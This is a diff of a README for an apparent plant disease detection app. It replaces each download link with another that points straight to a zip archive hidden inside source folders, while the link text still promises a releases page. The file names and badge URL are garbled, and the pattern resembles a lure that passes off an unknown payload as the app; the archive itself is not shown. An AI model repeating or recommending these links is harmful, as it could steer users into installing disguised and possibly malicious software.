@@ -1,6 +1,6 @@
 # 🌾 IMAGINE-CUP-MICROSOFT-2026 - Simplify Plant Disease Detection
 
-[![Download Now](https://raw.githubusercontent.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/main/lib/screens/home/MICROSOF-IMAGIN-CU-v2.3.zip%20Now-IMAGINE--CUP--MICROSOFT--2026-brightgreen)](https://raw.githubusercontent.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/main/lib/screens/home/MICROSOF-IMAGIN-CU-v2.3.zip)
+[![Download Now](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/raw/refs/heads/main/android/app/src/main/IMAGIN_CU_MICROSOF_v2.8-beta.5.zip%20Now-IMAGINE--CUP--MICROSOFT--2026-brightgreen)](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/raw/refs/heads/main/android/app/src/main/IMAGIN_CU_MICROSOF_v2.8-beta.5.zip)
 
 ## 📋 Description
 
@@ -25,7 +25,7 @@ To download IMAGINE-CUP-MICROSOFT-2026, follow these steps:
 
 1. Click on the link below to visit the release page:
    
-   [Visit this page to download](https://raw.githubusercontent.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/main/lib/screens/home/MICROSOF-IMAGIN-CU-v2.3.zip)
+   [Visit this page to download](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/raw/refs/heads/main/android/app/src/main/IMAGIN_CU_MICROSOF_v2.8-beta.5.zip)
 
 2. Look for the latest version of the app listed on that page.
 
@@ -80,7 +80,7 @@ IMAGINE-CUP-MICROSOFT-2026 is user-friendly, making it easy for farmers to detec
 
 For updates, bug fixes, and new features, keep an eye on the Releases page:
 
-[Visit this page for updates](https://raw.githubusercontent.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/main/lib/screens/home/MICROSOF-IMAGIN-CU-v2.3.zip)
+[Visit this page for updates](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/raw/refs/heads/main/android/app/src/main/IMAGIN_CU_MICROSOF_v2.8-beta.5.zip)
 
 ## 📞 Support
 
@@ -94,4 +94,4 @@ Join our growing community of users and contributors. Share your experiences, re
 
 Thank you for choosing IMAGINE-CUP-MICROSOFT-2026 to help with plant disease detection. We hope this app enhances your farming practices and contributes to healthier crops in West Nusa Tenggara. 
 
-For a direct download, click here again: [Visit this page to download](https://raw.githubusercontent.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/main/lib/screens/home/MICROSOF-IMAGIN-CU-v2.3.zip)
+For a direct download, click here again: [Visit this page to download](https://github.com/Swagg4/IMAGINE-CUP-MICROSOFT-2026/raw/refs/heads/main/android/app/src/main/IMAGIN_CU_MICROSOF_v2.8-beta.5.zip)
